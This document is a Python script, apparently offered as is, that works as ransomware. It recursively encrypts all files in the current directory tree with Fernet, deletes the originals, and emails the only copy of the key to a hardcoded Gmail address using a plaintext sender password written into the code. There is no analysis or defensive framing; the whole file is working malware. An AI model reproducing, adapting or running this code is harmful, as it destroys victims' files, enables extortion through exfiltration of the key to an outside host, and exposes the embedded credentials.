#!user/bin/python3 
from cryptography.fernet import Fernet
import os
from os import path
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import encodings.idna
def encryptFile(filename, f):
    try:
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename + '.oof', "wb") as file:
            file.write(encrypted_data)
        os.remove(filename)
    except IsADirectoryError:
        dirfiles = os.listdir(filename)
        for file in dirfiles:
            encryptFile(filename+'/'+file, f)
    
def encrypt():
    dirfiles = os.listdir('.')
    key = Fernet.generate_key()
    f = Fernet(key)
    mail_content = 'key.key'
    #The mail addresses and password
    sender_address = 'bsemail1298@gmail.com'
    sender_pass = 'Shivam123'
    receiver_address = 'bseemail1298@gmail.com'
    #Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'Encryption Key'
    #The subject line
    #The body and the attachments for the mail
    message.attach(MIMEText(mail_content, 'plain'))
    for filename in dirfiles:
        if(filename == 'fileen.py' or filename ==  'key.key' or filename == 'fileen'): continue
        encryptFile(filename, f)
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    attach_file_name = 'key.key'
    attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) #encode the attachment
    #add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    #Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
    session.starttls() #enable security
    session.login(sender_address, sender_pass) #login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Key exported...')
    os.remove('key.key')
def load_key():
    return open("key.key", "rb").read()

def decryptFile(filename, f):
    try:
        with open(filename, "rb") as file:
            # read the encrypted data
            encrypted_data = file.read()
        # decrypt data
        decrypted_data = f.decrypt(encrypted_data)
        # write the original file
        with open(filename[:-4], "wb") as file:
            file.write(decrypted_data)
        os.remove(filename)
    except IsADirectoryError:
        dirfiles = os.listdir(filename)
        for file in dirfiles:
            decryptFile(filename+'/'+file, f)
def decrypt(key):
    f = Fernet(key)
    for filename in os.listdir('.'):
        if(filename == 'fileen.py' or filename ==  'key.key'): continue
        elif(filename.endswith('.oof') or os.path.isdir(filename)):
            decryptFile(filename,f)
    os.remove('key.key')

if(path.exists('key.key')):
    print('Decrypting...')
    key = load_key()
    decrypt(key)
else: 
    print('Encrypting...')
    encrypt()